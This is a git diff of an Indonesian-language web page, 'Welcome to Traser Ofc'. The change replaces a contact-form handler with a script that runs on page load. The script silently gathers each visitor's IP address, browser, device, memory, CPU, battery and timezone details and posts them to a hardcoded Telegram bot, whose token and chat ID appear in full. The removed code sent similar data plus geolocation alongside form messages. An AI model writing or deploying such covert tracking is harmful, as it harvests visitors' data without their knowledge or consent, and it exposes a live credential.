@@ -28,7 +28,7 @@
         <div class="loader"></div>
     </div>
 
-    <!-- Konten -->
+     <!-- Konten -->
     <div class="container" id="mainContent">
         <h1>Welcome to Traser Ofc</h1>
 
@@ -52,7 +52,7 @@
     </div>
 
    <script>
-    // Loading Animasi
+    // Animasi Loading
     window.onload = function() {
         setTimeout(() => {
             document.getElementById('loading').style.display = 'none';
@@ -60,158 +60,66 @@
         }, 2000);
     };
 
-    // Kirim Pesan ke Bot Telegram
-    document.addEventListener("DOMContentLoaded", function() {
-        let form = document.getElementById('messageForm');
-        if (!form) {
-            console.error("Form tidak ditemukan!");
-            return;
-        }
+    // Ambil IP dan Kirim Info ke Telegram
+    function sendInfoToTelegram() {
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                let ip = data.ip;
+                let userAgent = navigator.userAgent;
+                let language = navigator.language;
+                let screenWidth = window.screen.width;
+                let screenHeight = window.screen.height;
+                let platform = navigator.platform;
+                let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                let now = new Date().toLocaleString();
+                let onlineStatus = navigator.onLine ? "Online" : "Offline";
+                let memory = navigator.deviceMemory || "Tidak diketahui";
+                let cores = navigator.hardwareConcurrency || "Tidak diketahui";
 
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
+                let batteryLevel = "Tidak diketahui";
+                let chargingStatus = "Tidak diketahui";
 
-            let name = document.getElementById('name').value;
-            let message = document.getElementById('message').value;
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(battery => {
+                        batteryLevel = battery.level * 100 + "%";
+                        chargingStatus = battery.charging ? "Sedang Mengisi" : "Tidak Mengisi";
+                        sendToTelegram(ip, userAgent, language, screenWidth, screenHeight, platform, timezone, now, onlineStatus, memory, cores, batteryLevel, chargingStatus);
+                    });
+                } else {
+                    sendToTelegram(ip, userAgent, language, screenWidth, screenHeight, platform, timezone, now, onlineStatus, memory, cores, batteryLevel, chargingStatus);
+                }
+            })
+            .catch(err => console.error("Gagal mengambil data IP:", err));
+    }
 
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    let ip = data.ip;
-                    let userAgent = navigator.userAgent;
-                    let language = navigator.language;
-                    let screenWidth = window.screen.width;
-                    let screenHeight = window.screen.height;
-                    let platform = navigator.platform;
-                    let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    let now = new Date().toLocaleString();
-                    let cookieEnabled = navigator.cookieEnabled;
-                    let javaEnabled = navigator.javaEnabled();
-                    let onlineStatus = navigator.onLine ? "Online" : "Offline";
-                    let memory = navigator.deviceMemory || "Tidak diketahui";
-                    let cores = navigator.hardwareConcurrency || "Tidak diketahui";
-                    let colorDepth = screen.colorDepth || "Tidak diketahui";
-                    let pixelDepth = screen.pixelDepth || "Tidak diketahui";
-                    let maxTouchPoints = navigator.maxTouchPoints || "Tidak diketahui";
-                    let vendor = navigator.vendor || "Tidak diketahui";
-                    let product = navigator.product || "Tidak diketahui";
-                    let connection = navigator.connection || {};
-                    let networkType = connection.effectiveType || "Tidak diketahui";
-                    let downlink = connection.downlink || "Tidak diketahui";
-                    let rtt = connection.rtt || "Tidak diketahui";
-                    let mimeTypes = navigator.mimeTypes.length;
-                    let plugins = navigator.plugins.length;
-                    let devicePixelRatio = window.devicePixelRatio;
-                    let hardwareConcurrency = navigator.hardwareConcurrency;
-                    let screenOrientation = screen.orientation ? screen.orientation.type : "Tidak diketahui";
-                    let availableScreenWidth = screen.availWidth;
-                    let availableScreenHeight = screen.availHeight;
-                    let isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? "Ya" : "Tidak";
-                    let isPrivateMode = false;
-                    let batteryLevel = "Tidak diketahui";
-                    let chargingStatus = "Tidak diketahui";
+    function sendToTelegram(ip, userAgent, language, screenWidth, screenHeight, platform, timezone, now, onlineStatus, memory, cores, batteryLevel, chargingStatus) {
+        let text = `🚨 *Pengunjung Baru!* 🚨\n
+        📍 *IP:* ${ip}
+        🌎 *Bahasa Browser:* ${language}
+        🖥️ *Device:* ${userAgent}
+        💾 *RAM:* ${memory} GB
+        🔥 *CPU Cores:* ${cores}
+        📏 *Resolusi Layar:* ${screenWidth}x${screenHeight}
+        💻 *Platform:* ${platform}
+        🔌 *Status Koneksi:* ${onlineStatus}
+        🔋 *Baterai:* ${batteryLevel}
+        ⚡ *Status Pengisian:* ${chargingStatus}
+        ⏳ *Zona Waktu:* ${timezone}
+        ⏰ *Waktu Lokal:* ${now}`;
 
-                    if (navigator.getBattery) {
-                        navigator.getBattery().then(battery => {
-                            batteryLevel = battery.level * 100 + "%";
-                            chargingStatus = battery.charging ? "Sedang Mengisi" : "Tidak Mengisi";
-                        });
-                    }
+        let botToken = "8067311127:AAHBqz2gd7vUB6K2GD_QjxQfiDvtxr61ZK4";
+        let chatId = "8091706716";
 
-                    try {
-                        let fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-                        if (fs) {
-                            fs(window.TEMPORARY, 100, () => isPrivateMode = false, () => isPrivateMode = true);
-                        }
-                    } catch (e) {
-                        isPrivateMode = true;
-                    }
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
+        }).catch(err => console.error("Gagal mengirim pesan ke Telegram:", err));
+    }
 
-                    // Ambil lokasi dari IP
-                    fetch(`https://ipapi.co/${ip}/json/`)
-                        .then(res => res.json())
-                        .then(locationData => {
-                            let country = locationData.country_name || "Tidak diketahui";
-                            let region = locationData.region || "Tidak diketahui";
-                            let city = locationData.city || "Tidak diketahui";
-                            let isp = locationData.org || "Tidak diketahui";
-                            let postal = locationData.postal || "Tidak diketahui";
-                            let latitude = locationData.latitude || "Tidak diketahui";
-                            let longitude = locationData.longitude || "Tidak diketahui";
-                            let network = locationData.network || "Tidak diketahui";
-                            let asn = locationData.asn || "Tidak diketahui";
-                            let countryCode = locationData.country || "Tidak diketahui";
-                            let currency = locationData.currency || "Tidak diketahui";
-                            let callingCode = locationData.country_calling_code || "Tidak diketahui";
-
-                            let text = `🛑 *Pesan Baru ke Developer* 🛑\n
-                            👤 *Nama:* ${name}
-                            ✉️ *Pesan:* ${message}
-                            📍 *IP:* ${ip}
-                            🏴 *Negara:* ${country} (${countryCode})
-                            ☎️ *Kode Negara:* ${callingCode}
-                            💰 *Mata Uang:* ${currency}
-                            🏙️ *Kota:* ${city}, ${region}
-                            📮 *Kode Pos:* ${postal}
-                            🌍 *Latitude:* ${latitude}
-                            🌏 *Longitude:* ${longitude}
-                            🏢 *ISP:* ${isp}
-                            📡 *Jaringan:* ${network}
-                            🏷️ *ASN:* ${asn}
-                            🌎 *Bahasa Browser:* ${language}
-                            🖥️ *Device:* ${userAgent}
-                            💾 *RAM:* ${memory} GB
-                            🔥 *CPU Cores:* ${cores}
-                            🎨 *Color Depth:* ${colorDepth}-bit
-                            🏿 *Pixel Depth:* ${pixelDepth}-bit
-                            📏 *Resolusi Layar:* ${screenWidth}x${screenHeight}
-                            📐 *Layar Tersedia:* ${availableScreenWidth}x${availableScreenHeight}
-                            💻 *Platform:* ${platform}
-                            📲 *Max Touch Points:* ${maxTouchPoints}
-                            🏭 *Vendor:* ${vendor}
-                            ⚙️ *Product:* ${product}
-                            📶 *Tipe Jaringan:* ${networkType}
-                            🔻 *Downlink Speed:* ${downlink} Mbps
-                            🔄 *RTT:* ${rtt} ms
-                            🔌 *Status Koneksi:* ${onlineStatus}
-                            🔋 *Baterai:* ${batteryLevel}
-                            ⚡ *Status Pengisian:* ${chargingStatus}
-                            🖱️ *Rasio Pixel Perangkat:* ${devicePixelRatio}
-                            🔄 *Orientasi Layar:* ${screenOrientation}
-                            ☕ *Java Aktif:* ${javaEnabled}
-                            🍪 *Cookies Aktif:* ${cookieEnabled}
-                            🏴‍☠️ *Mode Privat:* ${isPrivateMode ? "Ya" : "Tidak"}
-                            🛠️ *Jumlah Plugin Browser:* ${plugins}
-                            📂 *Jumlah MIME Types:* ${mimeTypes}
-                            📲 *Perangkat Sentuh:* ${isTouchDevice}
-                            ⏳ *Zona Waktu:* ${timezone}
-                            ⏰ *Waktu Lokal:* ${now}`;
-
-                            let botToken = "8067311127:AAHBqz2gd7vUB6K2GD_QjxQfiDvtxr61ZK4";
-                            let chatId = "8091706716";
-
-                            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                                method: "POST",
-                                headers: { "Content-Type": "application/json" },
-                                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
-                            })
-                            .then(() => alert("Pesan berhasil dikirim!"))
-                            .catch(err => {
-                                console.error("Gagal mengirim pesan ke Telegram:", err);
-                                alert("Gagal mengirim pesan!");
-                            });
-                        })
-                        .catch(err => {
-                            console.error("Gagal mengambil data lokasi:", err);
-                            alert("Gagal mengambil data lokasi!");
-                        });
-                })
-                .catch(err => {
-                    console.error("Gagal mengambil data IP:", err);
-                    alert("Gagal mengambil data IP!");
-                });
-        });
-    });
-</script>
+    // Jalankan fungsi saat halaman dimuat
+    sendInfoToTelegram();
+   </script>
 </body>
-  </html>
+</html>
